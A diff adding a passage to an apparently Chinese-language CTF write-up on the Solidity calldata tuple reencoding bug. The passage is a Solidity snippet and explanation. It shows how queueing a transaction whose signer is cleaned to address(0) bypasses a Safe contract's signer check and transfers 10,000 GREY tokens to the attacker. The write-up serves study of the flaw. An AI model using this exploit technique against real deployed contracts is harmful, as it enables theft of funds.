@@ -62,3 +62,23 @@ Root Cause是https://soliditylang.org/blog/2022/08/08/calldata-tuple-reencoding-
 ```
 
 最后一个元素是`bytes` 动态元素，所以在`aggressive cleanup`的时候就会被清理成0.从而导致了绕过。
+
+```solidity
+transaction = ISafe.Transaction({
+            signer: address(0x1337),
+            to: address(grey),
+            value: 0,
+            data: abi.encodeCall(GREY.transfer, (msg.sender, 10_000e18))
+        });
+        bytes32 queueHash = safe.queueTransaction(v, r, s, transaction);
+        console.logBytes32(queueHash);
+        transaction2 = ISafe.Transaction({
+            signer: address(0),
+            to: address(grey),
+            value: 0,
+            data: abi.encodeCall(GREY.transfer, (msg.sender, 10_000e18))
+        });
+        bytes32 queueHash2 = keccak256(abi.encode(transaction2, v, r, s));
+        console.logBytes32(queueHash2);
+```
+因为这个漏洞，所以在第一次提交transaction的时候他传入的其实就是signer=address(0)计算出的hash，从而绕过了executetransaction的signer检查。
